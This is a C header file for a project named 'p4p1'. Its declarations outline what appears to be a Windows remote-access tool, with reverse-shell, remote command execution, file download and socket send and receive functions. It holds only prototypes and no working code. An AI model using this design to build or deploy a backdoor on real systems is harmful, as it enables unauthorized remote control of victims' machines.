/*
** File Name: main.h
** Description: main header file for p4p1
** Made by: Leo Smith
**/

#ifndef _MAIN_H
#define _MAIN_H

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <fcntl.h>

#include "default.h"

struct main_struct {
	int port;
	int cn;

	char * ip;
	char * cmd;
	char * buf;

	SOCKET s;
	WSADATA wsa;

	struct sockaddr_in server;
};

void error(char *);
void first_line_to_buffer(FILE *, char *);
#ifdef _DEBUG
void debug(struct main_struct *);
#endif

int process_command(struct main_struct *);
int exe(struct main_struct *);

int cd(char *);
int wget(char *);
int get_file(char *, int );

int cnt(struct main_struct *m_s);
int close_cnt(struct main_struct *m_s);
int sender(SOCKET s, char * buf, int buf_size, int * connection_flag);
int receiver(SOCKET s, char * buf, int buf_size, int * connection_flag);

int reverse_shell(struct main_struct *m_s);

int setup(struct main_struct *);

typedef HRESULT (WINAPI *UDTF)(LPVOID, LPCTSTR, LPCTSTR, DWORD, LPVOID);

int setup_win(struct main_struct *);
int download_web(char *, char *);
int my_strcmp(char *, char *);
int my_strcpy(char *, char *, int);

#endif
